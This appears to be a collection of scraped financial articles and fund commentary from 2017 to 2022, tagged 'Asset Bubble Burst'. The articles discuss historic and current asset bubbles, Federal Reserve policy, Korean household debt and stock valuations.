Extreme market environments, similar to the one we are experiencing currently, are where we have historically been able to add significant value to investors’ portfolios. As the table shows, we have made some unconventional moves and owned some very unconventional portfolios in the face of market extremes.

Bubble GMO Position 1989 Japanese Equity Bubble Zero weight in Japan in International Equity portfolio 1999 TMT Bubble Reduced equity, focus on Value stocks, REITs, and bonds 2007 Global Financial Crisis/Risk Bubble Reduced equity, focus on U.S. Quality and long/short strategies 2022 Equity Superbubble Reduced equity, focus on non-U.S. Value and alternative strategies; Equity Dislocation at 20% (designed to profit from Growth bubble bursting); modest fixed income, no Treasuries, and only specialized credit

As we move through the fourth “bubble era” in GMO’s history, we have once again positioned our Asset Allocation portfolios to reduce risk and take advantage of what we believe will be a generational opportunity for adding alpha through asset allocation.

Equity Dislocation: Betting on the Bubble in Growth Stocks Bursting

While the overall U.S. market is in bubble territory as Jeremy has outlined, the epicenter of the bubble – both at home and abroad – is concentrated in Growth stocks. As such, the largest risk position in our flagship Benchmark-Free Allocation Strategy (as well as in our Alternative Allocation Strategy) is long a global portfolio of Value stocks and short a global portfolio of Growth stocks.

To build these portfolios, we use a proprietary definition of “Value” and “Growth” that aims to assess the intrinsic value of companies and provides, in our view, a better lens on valuation than traditional value metrics or indices. This approach has proved to be incredibly successful: in an unusual year like 2021, where Value beat Growth by 200 bps globally, our custom approach generated alpha of approximately 1,500 bps.

We believe significant room remains for this holding to continue its strong outperformance. This portfolio is available for direct investment via the Equity Dislocation Strategy. We also have worked with a client to build a pure U.S. Growth short portfolio, with a focus on the most expensive names in the Growth universe.

We believe this particular type of portfolio is an excellent hedge to the significant gains many have experienced via investments in technology-focused private equity and venture capital.

Limited Equity Risk and Focus on Most Attractive Pockets (Value, Quality, Thematic)

Outside of long/short strategies, we have reduced our equity risk considerably and emphasized non-U.S. stocks, which we believe are considerably cheaper than their U.S. counterparts. We have concentrated our exposure to non-U.S. Value stocks globally, including those in Emerging Markets and Japan.

To us, these stocks look very cheap relative to the U.S. and in the case of Emerging Markets and Japan Value, particularly Japanese Small Value, they are attractive in absolute terms as well. Japan also benefits from secular tailwinds related to shareholder-friendly reforms and improved profitability and return on shareholder equity.10

In our Global Equity and our benchmark-sensitive Global Asset Allocation portfolios, we have also maintained an allocation to our Quality Strategy, managed by our Focused Equity team and generally composed of outstanding companies with deep moats, low levels of leverage, and consistent, high, profitability.

We have seen clients who still want to maintain an allocation to Growth but are cautious about overall valuations allocate to our Quality Strategy. Quality generally has growthier characteristics, but because of our focus on valuation, our Quality Strategy is now more highly correlated to Value than at any point in the last 20 years.

Resource equities, which are largely a segment of Value, also look cheap relative to the rest of the world. We have also seen clients allocate to our Resources Strategy as a hedge against inflation. Finally, Jeremy has made a compelling case for owning our Climate Change Strategy, which seeks to take advantage of opportunities related to mitigating the effects of climate change.

The Resources and Climate Change portfolios are also managed by our Focused Equity team that, critically, maintains a significant valuation discipline in their stock selection.

Making Money While Reducing Risk

Navigating bubbles is fraught with all types of risk – absolute, relative, and career. This time is no different: when mean reversion will begin is inherently unknowable. However, there remain significant opportunities to make money and reduce risk in today’s market, just as there were in 1987, 1999, and 2008.

We know that selling winners and rebalancing into losers is good investment discipline but incredibly difficult to do for a whole host of behavioral reasons. That investment discipline is particularly critical given the risks Jeremy has articulated.

1 Of these, over 90% reverted to the old mean; almost 10% appeared to be paradigm shifts that persisted for decades. These 10%, however, were all in commodities, whose finite nature might suggest the possibility of permanent shortages and resulting price shifts – as has occurred in oil (whose old trend line for 70 years was about $23 in today’s currency); or in real estate where zoning restrictions have caused increasing shortages; or in a very few cases in equity markets in developing economies where prior to economic and financial development valuations had been extremely low.

2 It is worth noting, though, that in 2007 the U.S. house building industry had expanded to build an extra million houses, with all the stimulus to realtors et al., and retrenched by 2010 and 2011 to a half million fewer houses than normal. This drop packed a powerful punch and accounted for much of the depth of the recession and its resistance to stimulus. For a glimmer of good news, although our house prices in the U.S. are even more unaffordable and even more vulnerable than in 2006, at least the house building industry is only jogging along more or less normally now.

3 Note that the 2000 tech bubble was accompanied by unusually cheap bond markets (TIPS at 4.3%!); cheap real estate (REITs yielding over 9%); even cheap value stocks – it was focused solely on U.S. growth stocks and still we suffered from the negative wealth effect when it burst.

4 From the title of the excellent book by Richard Bookstaber.

5 The back-of-the-envelope calculation goes like this:

Currently, the U.S. nonfinancial corporate sector is worth $48 trillion. If cyclically-adjusted P/Es fall from their current level of nearly 40 to 25 – which would still be among the highest valuations ever recorded prior to 1997 – this would be a 37% loss of value, over $17 trillion. U.S. households own real estate worth $41 trillion. Current Census data on median household incomes and median home sale prices suggest a price to income ratio of about 5.5 after accounting for a considerable estimated increase in incomes in 2021 (last datapoint was 2020). If this ratio returns to 4.0 – which is well above any levels prior to the mid-2000s housing bubble – this would be a 27% loss of value, over $11 trillion. U.S. Treasury, agency/GSE, and corporate debt securities outstanding come to about $24 trillion, $11 trillion, and $15 trillion, respectively. We can quite conservatively estimate the duration of these three sectors at 5 years, 4 years, and 7 years, respectively. If rates rise a mere 2% – from current levels of -0.7% for 10-year TIPS, this would take us to only 1.3% real at the long end, still significantly below historic norms – and if corporate spreads rise only 0.5% on top of that, losses on debt securities would total about $6 trillion.

The problem is that since the intrinsic value of an asset can have a very wide range, a bubble is often justified by the flawed assumption that an asset's intrinsic value has skyrocketed, meaning the asset is worth much more than it fundamentally is.

Some bubbles are easier to predict than others. When it comes to the stock market, traditional valuation metrics can be used to identify extreme overvaluation. For example, an equity index that is trading at a price-to-earnings ratio that is twice the historical average is likely in bubble territory, though more analysis may be needed to make a conclusive determination. Other bubbles are harder to detect, and may only be identified in hindsight.

The average U.S. home lost one-third of its value when the housing bubble burst in 2009, resulting in the largest global economic contraction since the 1930s Depression, ushering in what has come to be known as the Great Recession.

Below are five of the biggest asset bubbles in history, three of which have occurred since the late 1980s.

Investopedia / Sabrina Jiang

1. The Dutch Tulip Bubble

The Tulipmania that gripped Holland in the 1630s is one of the earliest recorded instances of an irrational asset bubble. During the Dutch Tulip Bubble, tulip prices soared twentyfold between November 1636 and February 1637 before plunging 99% by May 1637, according to former UCLA economics professor Earl A. Thompson.

As bubbles typically do, Tulipmania consumed a wide cross-section of the Dutch population, and at its peak, some tulip bulbs commanded prices greater than the price of some houses.

2. The South Sea Bubble

The South Sea Bubble of 1720 was created by a more complex set of circumstances than Tulipmania. The South Sea Company was formed in 1711 and was promised a monopoly by the British government on all trade with the Spanish colonies of South America. Expecting a repeat of the success of the East India Company, which provided England a flourishing trade with India, investors snapped up shares of the South Sea Company.

As its directors circulated tall tales of unimaginable riches in the South Seas (present-day South America), shares of the company surged more than eightfold in 1720, from £125 in January to £950 in July, before collapsing in subsequent months and causing a severe economic crisis.

3. Japan's Real Estate and Stock Market Bubble

In the present day, asset bubbles sometimes are fuelled by overly stimulative monetary policy. Japan's economic bubble of the 1980s is a classic example. The yen's 50% surge in the early 1980s triggered a Japanese recession in 1986, and to counter it, the government ushered in a program of monetary and fiscal stimulus.

These measures worked so well that they fostered unbridled speculation, resulting in Japanese stocks and urban land values tripling between 1985 and 1989. At the peak of the real estate bubble in 1989, the value of the Imperial Palace grounds in Tokyo was greater than that of real estate in the entire state of California. The bubble burst in 1991, setting the stage for Japan's subsequent years of price deflation and stagnant economic growth known as the Lost Decade.

4. The Dot-com Bubble

When it comes to sheer scale and size, few bubbles match the dot-com bubble of the 1990s. At that time, the increasing popularity of the Internet triggered a massive wave of speculation in ""new economy"" businesses. As a result, hundreds of dot-com companies achieved multi-billion dollar valuations as soon as they went public.

The NASDAQ Composite Index, home to most of these technology/dot-com company stocks, soared from a level of about 750 at the beginning of 1990 to a peak of over 5,000 in March 2000. The index crashed shortly thereafter, plunging 78% by October 2002 and triggering a U.S. recession. The next time the Index reached a new high was in 2015, more than 15 years after its previous peak.

5. The U.S. Housing Bubble

Some experts believe that the bursting of the NASDAQ dot-com bubble led U.S. investors to pile into real estate due to the mistaken belief that real estate is a safer asset class. While U.S. house prices nearly doubled from 1996 to 2006, two-thirds of that increase occurred from 2002 to 2006, according to a report from the U.S. Bureau of Labor Statistics. Even as house prices were increasing at a record pace, there were mounting signs of an unsustainable frenzy—rampant mortgage fraud, condo ""flipping,"" houses being bought by sub-prime borrowers, etc.

U.S. housing prices peaked in 2006, and then commenced a slide that resulted in the average U.S. house losing one-third of its value by 2009. The U.S. housing boom and bust, and the ripple effects it had on mortgage-backed securities, resulted in a global economic contraction that was the biggest since the 1930s Depression. This period of the late 2000s thus came to be known as the Great Recession.

The Bottom Line

Although every bubble is different, one common element in most bubbles is the willingness of participants to suspend disbelief and to steadfastly ignore the increasing number of cautionary signs. Another is that the bigger the bubble, the greater the damage it inflicts when it bursts. And perhaps most important is that the five biggest historic bubbles, along with others along the way, hold valuable lessons that should be heeded by all investors.",Asset Bubble Burst,2017-03-25 14:01:17

So, the rally has to end sometime, right? There’s always a catalyst, and the past two days’ drops suggest it might be climbing inflation. And, after all, we’ve been hearing for some time that the market is in a bubble, which makes the situation particularly precarious.

Ultimately, the likes of Nvidia and other tech names have done well of late. And the so-called Shiller P/E Ratio is at a very lofty level. This version of the price/earnings multiple, or P/E, is at a level that surpasses the run-up to the 1929 crash and is nearing the record set right before the 2000 dot-com implosion.

Richard Bernstein Associates in June listed five indications of a market bubble, which kind of matches up with the current stock market: massive liquidity, expanding leverage, more amateurs involved in stocks, an explosion of initial public offerings (IPOs), and increasing trading. The firm’s report is as relevant as ever. “The entire market doesn’t necessarily seem at risk, but momentum strategies focused on the market’s bubble leadership seem very risky to us,” the firm’s research note warned.

Sure, people have been saying we’re in a bubble for a while now. But wouldn’t it have been lovely to have gotten out of the market or, at least, the tech end of it, right before the March 2000 end of the dot-com euphoria? If such a prescient investor shifted money to small-caps, energy, or financial stocks, the ensuing bear market wouldn’t have been too bad.

Bernstein’s five horsemen of the market apocalypse do—let’s face it—have an eerie air of familiarity about them:

Liquidity. Thanks to the Federal Reserve, with help from the Trump and Biden administrations, the money supply (aka M2) has expanded enormously. To offset the degradations of the pandemic, M2 has grown 35% since January 2020. A lot of it, though, wasn’t deployed as bank lending. The upshot, as Bernstein’s paper points out, has been a ballooning of stocks. As the study puts the matter: “The Fed’s stimulus has increasingly been trapped within the financial markets and fueled speculation rather than healthy economic activity.”

Leverage. Margin lending has been on the upswing. According to a MagnifyMoney survey the report cites, 40% of individual investors overall, including 80% of Gen Z investors, and 60% of Millennials, had borrowed to play the market.

Amateurs. In Bernstein’s view, “Despite the associated noble intentions, every financial bubble includes a democratization of the market: ‘Everyone should get to play.’” The paper notes the proliferation of individual investor chat boards, enlarged trading platforms, and meme stocks suggest “the current speculative fervor includes everyone.”

IPOs. Stock-buying fads help bring down the cost of capital—and low, low interest rates have aided that. Not all of these new issues are great, if the barriers to entry are lowered. Bernstein zeroes in on the increase is special purpose acquisition companies (SPACs), which are easy ways to go public with less regulatory scrutiny.

Trading. The zest of meme stock traders harkens back to earlier eras. The Bernstein report recounts how “day traders boosted trading volume during the Technology Bubble and flipping condos spurred turnover during the Housing Bubble.”

If a bright side exists, Bernstein concludes, it’s that just three sectors in the current market have been in bubble territory—technology, communication services, and consumer discretionary—leaving other areas with less distance to fall.

A company's valuation should be determined by its business fundamentals -- its profits, growth rate, and similar factors. In a bubble, speculation and euphoria take over.

The dot-com bubble of the late 1990s may be the most recent famous example of a stock market bubble. Tech stocks surged, fueled by high expectations for a new internet economy. When those expectations were not realized, almost all of the tech stocks that had gained value during the boom years plunged or the underlying companies went out of business entirely. Arguably, the collapse in high-growth tech stocks from 2021 to early 2022 was also evidence of a bubble.

Not every surge in stock prices is a sign of a bubble, however. Sometimes, large stock gains are justified by the companies' performances. For example, Amazon (NASDAQ:AMZN) stock has jumped in price by 1,760% in the past decade, but the company's earnings have increased even more during that time, and its competitive advantages have strengthened.

5 stages of a stock market bubble

All stock market bubbles eventually burst, meaning that stock prices suddenly and sharply decline. While any number of events can lead to a bubble bursting, stock market crashes often occur after a key source of credit dries up. A credit contraction was the main reason for the 2008 housing bubble bust, which triggered a global financial crisis.

Economists generally agree that there are five stages of an economic bubble:

Displacement: This is a paradigm-shifting event. In the case of the housing bubble, this meant lower interest rates (thanks to looser monetary policy from the Federal Reserve Board), easier access to subprime mortgages, new mortgage derivatives from Wall Street, and the fact that U.S. real estate prices had not suffered a sustained, national decline in generations. Boom: This is the phase when asset prices begin increasing rapidly. Rising prices attract new investors (or homebuyers, in the case of a housing bubble), but it isn't yet clear that the rise in prices is unwarranted. Euphoria: This is the phase were investors tend to make irrational decisions under the assumption that the bubble will continue to inflate. Some people refer to this as the greater fool theory, which is the belief that there will always be someone willing to pay a higher price for an asset than you did. In the case of the housing market, unqualified homeowners were buying homes with the intention of flipping them and making easy money. Peak: Prices eventually top out, and the smart money begins to sell. Market sentiment starts to shift. In the housing bubble, this phase was harder to detect since housing prices aren't readily listed like stock prices. But there were signs that defaults were starting to rise and easy credit was going away. Collapse: Bubbles tend to leave many retail investors financially ruined, and the housing bubble bust was no different. Home prices fell nationally between 2006 and 2012, leaving homeowners underwater, bankrupt, and with their credit destroyed. Just as prices are overinflated at the peak of the bubble, they tend to be undervalued during the bust.

The reasons for the dot-com bubble burst are slightly more complicated. In this instance, the tech companies' performances didn't match investors' expectations. Many of the dot-com names that went bankrupt had flawed business models that made them incapable of turning a profit. In this bubble, the credit came from venture capitalists and other investors eager to pour money into any business with "".com"" in its name. The dot-com companies' growth eventually slowed, profits didn't materialize, and tech stock prices plunged.

Again, Amazon offers a useful example here. In 2000, the Nasdaq Composite Index (NASDAQINDEX:^IXIC) peaked, seemingly because all the new internet companies, Amazon included, had exhausted the initial wave of investor demand. Tech stock prices tumbled as a result. The e-commerce company's revenue growth slowed from 169% in 1999 to just 13% in 2001, tracking with the market's boom and bust. Amazon's stock price declined by more than 90% from peak to trough in just two years.

Are we in a bubble right now?

It's rarely clear in real time if we're in a stock market bubble. Looking at the S&P 500 (SNPINDEX:^GSPC) as a whole, there isn't much evidence of a bubble. A broad-market index, the S&P 500 entered correction territory in late February 2022, meaning a decline of more than 10% from a recent peak in a bull market. A bubble, however, generally implies a much greater decline.

Still, there is evidence of a bubble in a subsector of stocks, especially for pandemic winners and other tech stocks. Zoom Video Communications (NASDAQ:ZM) fell more than 75% from its pandemic-era peak, Peloton (NASDAQ:PTON) was down nearly 90% at one point, and Wayfair (NYSE:W) dropped by two-thirds. In other words, the bubble in pandemic stocks and others, such as cloud computing stocks, seems to have burst.

There's reason to believe there's still a bubble in other subsectors such as electric vehicle (EV) stocks, many of which have perfect scenarios priced in. There's no obvious credit source fueling stock price increases in the current market environment, although there is evidence of a spike in retail stock trading since millions of Americans have recently opened accounts with Robinhood (NASDAQ:HOOD) and other retail trading platforms. Additionally, pandemic stimulus payments, enhanced unemployment benefits, and other government relief measures have helped to fuel a bubble.

Speculation is a key driver of any stock market bubble and a clear warning sign. Investors buy stocks not just because they believe their underlying values will rise but also because they believe the stock market will remain liquid, enabling them to easily sell their stocks at any time. During stock market bubbles, stock prices becomes divorced from the underlying business fundamentals yet continue to rise based on the assumption that speculators will continue to buy. A similar phenomenon seems to have occurred with Bitcoin (CRYPTO:BTC) and other cryptocurrencies since mid-2020 as their prices have also surged. When valuation metrics such as price-to-earnings ratios and price-to-sales ratios are well out of the historical range, that's evidence of a bubble.

Often the clearest sign of a stock market bubble is market sentiment, or how investors feel about the stock market. J.P. Morgan famously sold his stock holdings ahead of the Great Depression after a shoeshine boy asked him how he could buy stocks. Similarly, there were signs on social media platforms during much of the pandemic boom of euphoric sentiment in the market.

How to protect your portfolio during a stock market bubble

The easiest way to preserve your portfolio's value during the bursting of a stock market bubble is to only hold stocks with strong business fundamentals. In the current environment, Target (NYSE:TGT) and Alphabet (NASDAQ:GOOG) (NASDAQ:GOOGL) offer good examples.

Easy come, easy go is the way of portfolio gains during market bubbles. Stock prices that have jumped for little ""fundamental"" reason can easily lose value if (and when) investor sentiment changes like it did for tech stocks in the late 1990s and pandemic stocks over the past year.

Another way to protect your portfolio during a stock market bubble is to buy put options, which enable you to sell stock at a pre-determined price within a certain time period. You may also use stop-loss orders, which instruct your broker to sell a stock once its price declines to a certain value. The disadvantages of these alternatives are that buying put options can be expensive, and stop-loss orders might be executed during only a modest market pullback rather than a bubble popping entirely. Timing the market, after all, is almost impossible.

The past two years have shown how unpredictable the stock market can be. There's no perfect way to insulate yourself from volatility in the stock market, and bubbles do occur from time to time. The best approach, and one of the easiest, is to buy shares in high-quality companies and hold them for the long term.",Asset Bubble Burst,2022-02-28 08:00:00

However, by now one thing should be clear. Through its truly massive bond-buying program, the Federal Reserve has created and continues to create asset price and credit market bubbles. Based on past experience, this hardly bodes well for the US economy having a soft-landing next year when the music of ultra-easy money eventually stops playing.

Anyone doubting that the U.S. economy is now in the grips of yet another housing market bubble need only take a cursory look at the authoritative Case-Shiller housing price index. Adjusted for inflation, that index is now at approximately at the same level that it reached in 2006 at the peak of the last housing market bubble. Of further concern is the fact that U.S. home prices are continuing to rise at an annual 12 percent rate.

Anyone doubting that we are also experiencing an equity market bubble need only look at today’s extraordinarily stretched equity market valuations. As measured by cyclically-adjusted price-earnings ratios, today’s equity valuations are more than double their long-term average. More striking yet is the fact that these valuations are at lofty levels that have been experienced only once before in the last one hundred years.

The one thing that the U.S. housing and equity-market bubbles have in common is that they have been fueled by an unprecedentedly rapid pace of Fed bond buying aimed at keeping long-term interest rates low to stimulate the economy. Whereas following the 2008 Lehman bankruptcy it took Ben Bernanke’s Fed six years to increase the size of the Fed’s balance sheet by around $ 4 trillion, in the wake of the Covid-19 pandemic it has taken the Powell Fed barely six months to do the same thing.

Over the past few decades, a persistent weakness of the Fed has been its seeming lack of attention to the asset price bubbles that it creates until those bubbles happen to burst. The Powell Fed would seem to be no exception. Even at a time that the Fed’s own Financial Stability Report acknowledges that there is considerable froth in the housing and equity markets, the Fed is only now starting to think about tapering its bond-buying program. Meanwhile, it continues to add froth to those markets by buying $80 billion a month in U.S. Treasury bonds and $40 billion a month in mortgage backed securities.

To be sure, the U.S. banking system is in a very much better position to weather a housing market today bust than it was in 2008. Lending standards in the housing market today are very much better than they were back then. In addition, today’s banks are very much better capitalized now than they were before.

However, unlike in 2008, the problem for the U.S. financial system this time around is that the prospective housing market bust would not be occurring in isolation. Rather, any housing market bust triggered by higher interest rates would all too likely be accompanied by the bursting of the many other asset and credit market bubbles around the globe that have been spawned by the money printing of the world's major central banks. These include the U.S. and global equity bubbles, the bubbles in the U.S. and European high-yield credit markets, and the emerging market debt bubble.

All of this makes it difficult to understand the Fed’s thinking as it clings to its ultra-easy monetary policy at a time that the economy is recovering strongly and asset and credit market bubbles are in plain sight. By keeping its pedal to the monetary policy metal at the same time that the country is engaged in its largest peacetime budget stimulus on record risks overheating the economy and being forced to slam on the monetary policy brakes. Meanwhile, by continuing its large-scale bond-buying operation, it adds fuel to the asset price bubbles making it all the more difficult for the Fed to engineer a soft economic landing.

One has to hope that the Fed soon realizes the dangerous path on which its currently ultra-loose monetary policy is placing the U.S. economy. At a minimum, one has to hope that the Fed soon stops buying mortgage-backed securities in the midst of a housing market bubble. However, judging by Fed Chair Jerome Powell’s most recent pronouncements on this matter, I would not suggest holding one’s breath for this to happen.

The rupture of Japan’s bubble in the 1990s after a decade of economic prosperity has been cited as an important case study for the South Korean economy given the similarities between the two countries’ economic structures, and their financial and legal systems.The prosperity in Japan brought about a rapid acceleration of asset prices some 30 years ago, when real estate and stock market prices became “overheated.” After the bubble burst in 1992, Japan entered a long period of economic stagnation that left investors out in the cold.Today, amid Korea’s snowballing household debt in fast-surging asset markets from housing to stock, critics have been ringing the alarm and suggesting Asia’s fourth-largest economy might be following in Japan’s footsteps. A bubble burst is imminent here, they say.Though experts are divided on whether the real estate market has entered a bubble, the nation’s fiscal and monetary policy leaders have indirectly acknowledged that it is at least close.Finance Minister Hong Nam-ki recently warned that a “sharper-than-expected” price correction could happen, while Bank of Korea Gov. Lee Ju-yeol said last month that the nation’s housing prices had become “overrated.”“Both South Korea and the US real estate markets have entered a bubble,” said economist Han Sang-wan, former head of research at the Hyundai Research Institute.“The property prices will continue to surge to the end of this year and on to next year and if the bubble bursts, Korea will be dealt a harsher blow compared with the US,” he added.Median apartment prices in Seoul and other key metropolitan areas here gained 11 percent from the beginning of the year through July, marking the largest gain in the cited period since the state-run Korea Real Estate Board started compiling data in 2003. Average apartment prices in the nation’s capital, Seoul, gained nearly 100 million won ($87,000) or 9.7 percent in the first six months of this year to record 1.14 billion won, real estate data provided by KB Kookmin Bank showed last month.Separate data from KB Kookmin showed that average apartment prices in Seoul grew 19 percent on-year in July, hitting a 19-year high. Not since 2002, when the corresponding figure stood at 23.1 percent, have apartments in the capital been more expensive.Commercial banks here have started to temporarily halt either all or some of their mortgage lending, wary of the rapid growth in household credit and financial regulators’ warnings of “strong” measures to tackle the issue.According to Han, the real problem lies with the heated housing market, rather than the stock market.“Before every financial crisis in history -- especially the 2008 subprime mortgage crisis -- a real estate bubble collapse took place,” Han explained.“It hit the US and the European markets the hardest because the economies at the time were burdened with an unprecedented growth of household debt,” the expert added. From 2001 to 2007, US mortgage debt -- the largest component of household debt there -- nearly doubled.If a bubble is about to burst, Korea is in trouble. Korea’s household debt-to-gross domestic product ratio gained some 7 percentage points to 90.3 percent as of the end of the first quarter compared with end-2019, according to the Korea Institute of Finance. Household credit gained a record 168 trillion won on-year or 10.3 percent in the second quarter to 1,805 trillion won, according to central bank data released Tuesday.The growth has so far shown no signs of slowing down, with people flocking to banks to purchase homes on low-rate mortgages, fearing they might miss the opportunity as prices continue to rise.“The domestic economy has always excessively relied on the nation’s real estate market,” said Seo Young-soo, a Kiwoom Securities analyst.“The housing prices have jumped in the short-term, which means that once prices start to drop, the damage will be colossal,” he added.But those less skeptical say it is too early to label the current situation a bubble.“It’s the same story over and over again -- we have been concerned that the market would enter a bubble, collapse and enter a period of economic stagnation similar to that of Japan for the last 20 years,” said Joo Won, deputy director of the Hyundai Research Institute.“As long as there is a solid supply of capital, the risk won’t grow too big and other global economies have been dealing with the same overheated real estate market,” he added.Following in the footsteps of commercial lenders, some of the local brokerages have temporarily suspended their securities-based lending services. This was apparently due to the record outstanding loans extended by brokerages for stock investments. Total lending in this category crossed the 25 trillion won mark for the first time Aug. 13 and remained there for four trading days, Korea Financial Investment Association data showed.The record-low interest rate and increased borrowing have fueled a “Donghak Ant Movement” -- a stock-buying spree driven by retail investors -- and the country’s benchmark Kospi has shot above 3,300 points, while the tech-heavy Kosdaq traded above the 1,000-point level in the first half of this year for the first time since the dot-com bubble burst 20 years ago.Though experts admit that the stock market may have entered a “bubble,” they say the current rally will have more resilience than the real estate boom.“Under long-term anticipations that the job market and inflation will stabilize, the bubble is unlikely to burst easily,” said Lee Eun-taek, an analyst at KB Securities.“Despite warnings of a bubble, it is too early to give up on the Korean stock market and once the market overcomes ‘tapering’ issues, it is projected to extend its growth.”In recent sessions, the US Federal Reserve’s July meeting minutes -- hinting at tapering as early as the fourth quarter of this year -- sent jitters across the country’s main bourse, the Kospi.The BOK has been hinting at a shift in its monetary policy for some time now and is widely expected to carry out a 25-basis-point rate hike at its upcoming rate-setting meeting, scheduled for Thursday. It has maintained a record-low interest rate of 0.5 percent for more than a year now, with the economy continuing to combat coronavirus woes.The BOK rate hike is projected to suck excess liquidity from the market, and while it will put the brakes on the nation’s snowballing debt, investors should keep an eye on US monetary policy, Han warned.“The first sign of a bubble collapse is sharp rate hikes, which would lead to an inflow of dollars back to the US from global markets,” the expert said.“But the US Fed has yet to even start tapering, so there is still some time,” he added.By Jung Min-kyung ( mkjung@heraldcorp.com",Asset Bubble Burst,2021-08-25 07:00:00

The one call we got overwhelmingly right in 2021 was our outlook on inflation. While the big names stuck to the transitory narrative, we repeatedly made fun of that concept and also of the silly idea that bond yields were useful in forecasting inflation.

That data is still coming in strong although some tempering is likely in the near future. The Federal Reserve has abandoned the transitory narrative and now needs to at least make a modicum of effort to bring inflation under control. Wages are going to move up here as the supply of labor is weak, like we predicted some time back.

The extremely low approval numbers of the current President are being linked in multiple polls to out-of-control inflation. This is likely to get government pressure on the Fed to move faster on interest rates. Current prediction is for four hikes alongside a balance sheet taper from September.

How this impacts markets is anyone's guess as we have not had such rapidly tightening policies in a long time. We have never had them with the collective wisdom thinking that you can pay 20X sales multiples for ""growth"". Well not since 2000 at least. If you remember, that bubble popped and all the interest rate cuts after that had no impact in reviving it.

When policy tightening blew up the subprime bubble, all the Quantitative Easing and interest rate cuts, again, did not reflate that bubble during the recovery.

Our point is that when the bubble is done, it is done.

That might be a good thing though. Asset bubbles bursting, especially with the $2.8 trillion in cryptocurrencies going to zero, would get people suddenly feeling less wealthy. That should retrace the retail sales back to trend line. That in turn, will reduce inflationary pressures significantly.

Of course a drop all the way to the trend line would normally indicate a recession. We will have more on this as things develop.

Threats & Opportunities

So far value stocks have held up while the high growth names have been pummeled. We may also be at a big cyclical inflection point, which means growth investors will have a hard time making good returns for many years.

Source: CIBC, highlights from author

But we have not seen an earnest selloff yet in the mega-cap names. These are holding up the market.

The market as a whole remains, very, very expensive, and here is the EV to EBITDA of some names we follow.

To put those numbers in context, the market as a whole peaked in 2000 at an EV to EBITDA of 14 and the NASDAQ took 14 years to exceed those levels.

So these numbers are in deep dangerous territory. When the selloff begins and if it appears the only way out is a recession to bring inflation under control, don't expect anything to get spared. Even if you believe inflation will stay high and the Federal Reserve will step back after 2-3 hikes, then you have this chart to contend with. If the 5-Year average CPI hits 5%, you will likely get a big P/E multiple drop.

Among sectors where we have a big allocation, REITs are likely to be quite vulnerable initially as their bond-like yields will suddenly find some competition. They are sensing this to some extent and those with extreme multiples have begun to feel the heat.

The whole REIT sector is likely to get some intense selling pressure but at the same time, some names will just be getting their large CPI-based rent hikes from tenants. The combination is likely to set up some good buying points (not necessarily for any of those above) in 2022. Energy is another sector where we might increase allocations further on a pullback as the fundamentals continue to get stronger for a longer-term bull market. Cash will be crucial to navigate the environment and we are aiming for 30%-50% cash (currently about 24%).

An Institutional Investor Hall of Famer sees an urgent need for investors in some of the most popular trades to diversify. Rich Bernstein, who has spent decades on Wall Street, is waving the red flag on long-duration assets ranging from Big Tech to bitcoin to Reddit rebellion stocks to long-term bonds. ""We are right in maybe the biggest bubble of my career,"" Bernstein, the CEO and CIO of Richard Bernstein Advisors, told CNBC's ""Trading Nation"" on Monday. His warning implies the magnitude is bigger than the dot-com and housing bubbles.

'Kryptonite for this bubble'

""The Fed has so distorted the long-end of the curve that we are seeing a very natural reaction among long-duration assets which is then taking on a life of its own,"" said Bernstein. ""Anybody who's out there in these long-duration assets has to be firmly convinced that long-term interest rates are not going to go up because that's the kryptonite for this bubble."" Bernstein believes the backdrop is more perilous than June, when he warned on ""Trading Nation"" that bitcoin was a bubble. The cryptocurrency has rallied since then, but it's still off about 20% over the past three months. ""When you get into a bubble, people become very myopic. They look only at a very small universe of investments,"" he said. ""People always say to me 'Okay. Well, you're so smart. When is the bubble going to burst?' And, the answer is nobody knows.""",Asset Bubble Burst,2021-08-09 07:00:00

Aug 26 (Reuters) - Wall Street is screeching to yet another all-time high, just as the Fed's Jackson Hole symposium is set to address wealth inequality and the central bank's role in fueling asset price inflation is once again coming under harsh scrutiny.

It is undeniable that trillions of dollars of asset purchases and years of official interest rates of zero and 10-year bond yields barely above 1% have boosted stock prices.

But the significance of Fed actions are overstated.

The tech-heavy composition of Wall Street, which benefits more from low interest rates and plain old stronger economic growth, are adding fuel to the U.S. stock surge. And the Fed's large balance sheet expansion is nowhere near the European Central Bank or Bank of Japan's.

Look no further than Wall Street: The S&P 500 (.SPX) has more than doubled from its COVID low of March last year, chalking up 51 record highs this year.

According to Ryan Detrick, chief market strategist at LPL Financial in Charlotte, North Carolina, only 1964 and 1995 had more than 50 new highs by the end of August. He reckons the S&P 500 could make 78 new highs this year, eclipsing the all-time record of 77 set in 1995.

On a 12-month forward earnings valuation basis, the S&P 500 earlier this year was its most expensive since 1999, just before the tech bubble burst. This price/earnings ratio has since drifted lower. But it is still above 20, which is unfamiliar territory for most of the last two decades.

12-month forward earnings P/Es

Official interest rates and ultra-low benchmark bond yields make investing in profitable, cash-generating companies an attractive proposition. To some investors desperate for return, riskier stocks are a no-brainer.

Many argue there is a natural consequence of the Fed doubling the size of its balance sheet to $8.3 trillion since the pandemic outbreak.

As a share of GDP, that is now around 40%.

With stocks and other financial assets mostly in the hands of society's better off, critics say U.S. monetary policy is widening the gap between rich and poor and directly exacerbating wealth inequality.

The world's second and third largest central banks, meanwhile, have also ramped up their pandemic-fighting asset purchases. Their balance sheets, as a share of GDP, are far bigger than the Fed's. Yet stock markets and valuations in the euro zone and Japan are nowhere near as high.

""The commonly held narrative centers on the Fed, and if everyone believes that, then it is self-reinforcing,"" said Meb Faber, co-founder and chief investment officer at Cambria Investments in El Segundo, California.

""But there is a limit as to how far you can extrapolate that.""

Total assets

Share of GDP

The ECB has grown its balance sheet to $9.5 trillion since the outbreak of the pandemic. The ECB's balance sheet is now worth more than 60% of euro zone GDP.

Similarly, the Bank of Japan has grown its balance sheet by $1.4 trillion since March 2020 to $6.6 trillion, around 120% of GDP.

Yet the euro Stoxx 50 (.STOXX50) is up 'only' around 65% from the COVID low, and is still 23% below its record high from March 2000. Euro stocks' 12-month forward price/earnings ratio is around 16.

Japan's Topix (.TOPX) is up 55% from the COVID low and has a forward multiple of around 13.

Both figures, again, are significantly below their U.S. equivalents, suggesting factors other than central bank largesse are behind Wall Street's surge.

For one, the U.S. equity market is far more tech- and digital-heavy than its global peers.

